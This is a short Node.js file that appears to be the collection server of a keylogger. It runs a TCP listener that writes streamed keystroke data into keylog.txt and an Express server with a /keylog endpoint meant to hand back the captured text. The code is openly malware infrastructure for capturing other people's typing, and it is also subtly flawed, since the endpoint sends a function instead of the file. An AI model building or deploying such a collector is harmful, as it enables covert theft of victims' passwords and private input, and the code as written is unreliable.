const net = require('net');
const path = require('path');
const { writeFileSync, readFileSync } = require('fs');
const express = require('express');
const app = express();

app.use('/', express.static(path.join(__dirname + '/public'))); //<-- Sends page
app.get('/keylog', (req, res) => {
    res.send(_ => readFileSync('./keylog.txt'));
});

const server = net.createServer(socket => {
    console.log("Client connected!");
    socket.on('data', data => {
        try {
            writeFileSync('./keylog.txt', data.toString(), { mode: 0o755 });
        } catch(error) {
            console.error(error);
        }
    })
});

app.listen(8080)    //<--Express server (delivers page and has endpoint)
server.listen(3000);    //<--Net server (listen socket streaming)